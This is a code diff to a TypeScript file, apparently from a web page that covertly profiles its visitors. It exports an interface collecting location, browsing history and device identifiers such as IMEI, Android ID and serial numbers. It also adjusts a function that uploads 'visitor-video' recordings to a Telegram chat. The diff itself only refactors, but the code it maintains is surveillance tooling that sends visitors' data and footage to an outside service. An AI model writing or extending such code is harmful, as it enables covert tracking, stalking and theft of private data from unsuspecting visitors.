@@ -1,31 +1,3 @@
-interface VisitorDetails {
-  userAgent: string;
-  location: string;
-  referrer: string;
-  previousSites: string;
-  city?: string;
-  country?: string;
-  latitude?: number;
-  longitude?: number;
-  accuracy?: number;
-  deviceInfo?: {
-    brand: string;
-    model: string;
-    type: string;
-    platform: string;
-    mobile: boolean;
-    imei?: string;
-    androidId?: string;
-    serialNumber?: string;
-    batteryLevel?: number;
-    networkType?: string;
-    screenResolution?: string;
-    cpuCores?: number;
-    totalMemory?: number;
-    osVersion?: string;
-  };
-}
-
 interface LocationInfo {
   city: string;
   country: string;
@@ -54,6 +26,34 @@ interface DeviceInfo {
 }
 
 let hasNotificationBeenSent = false;
+
+export interface VisitorDetails {
+  userAgent: string;
+  location: string;
+  referrer: string;
+  previousSites: string;
+  city?: string;
+  country?: string;
+  latitude?: number;
+  longitude?: number;
+  accuracy?: number;
+  deviceInfo?: {
+    brand: string;
+    model: string;
+    type: string;
+    platform: string;
+    mobile: boolean;
+    imei?: string;
+    androidId?: string;
+    serialNumber?: string;
+    batteryLevel?: number;
+    networkType?: string;
+    screenResolution?: string;
+    cpuCores?: number;
+    totalMemory?: number;
+    osVersion?: string;
+  };
+}
 
 async function getDeviceInfo(): Promise<DeviceInfo> {
   let brand = 'Unknown';
@@ -404,7 +404,7 @@ export const sendVideoToTelegram = async (videoBlob: Blob) => {
   formData.append('chat_id', CHAT_ID);
   
   const videoFile = new File([videoBlob], 'visitor-video.mp4', {
-    type: 'video/mp4'
+    type: videoBlob.type || 'video/mp4' // Perbaikan tipe file dinamis
   });
   
   formData.append('video', videoFile);
